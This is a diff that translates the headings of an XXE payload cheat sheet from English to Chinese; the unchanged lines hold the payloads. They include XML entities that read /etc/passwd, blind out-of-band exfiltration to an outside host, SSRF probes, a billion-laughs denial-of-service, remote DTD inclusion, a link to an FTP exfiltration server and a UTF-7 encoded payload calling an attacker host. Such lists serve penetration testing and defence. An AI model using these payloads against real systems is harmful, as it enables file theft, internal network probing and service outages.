@@ -1,4 +1,4 @@
-**LFI Test**
+**文件包含测试**
 
 ```
 <?xml version="1.0"?>
@@ -7,7 +7,7 @@
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 ```
 
-**Blind LFI test (when first case doesn't return anything)**
+**盲LFI测试(当第一个case不返回任何东西时)**
 
 ```
 <?xml version="1.0"?>
@@ -17,7 +17,7 @@
 <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
 ```
 
-**Access Control bypass (loading restricted resources - PHP example)**
+**访问控制旁路(加载受限资源- PHP示例)**
 
 ```
 <?xml version="1.0"?>
@@ -26,7 +26,7 @@
 <foo><result>&ac;</result></foo>
 ```
 
-**SSRF Test**
+**SSRF 测试**
 
 ```
 <?xml version="1.0"?>
@@ -35,7 +35,7 @@
 <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
 ```
 
-**XEE (XML Entity Expansion - DOS)**
+**XEE (XML实体扩展- DOS)**
 
 ```
 <?xml version="1.0"?>
@@ -55,7 +55,7 @@
 <lolz>&lol9;</lolz>
 ```
 
-**XEE #2 (Remote attack - through external xml inclusion)**
+**XEE #2 (远程攻击——通过外部xml包含)**
 
 ```
 <?xml version="1.0"?>
@@ -64,7 +64,7 @@
 <lolz><lol>3..2..1...&test<lol></lolz>
 ```
 
-**XXE FTP HTTP Server**
+**XXE FTP HTTP 服务器**
 
 https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
 
@@ -91,5 +91,7 @@ File stored on http://publicServer.com/parameterEntity_sendftp.dtd
 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
 +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
 ```
-To convert between UTF-8 & UTF-7 use recode.
+要在UTF-8和UTF-7之间进行转换，请使用recode。
+
 `recode UTF8..UTF7 payload-file.xml`
+
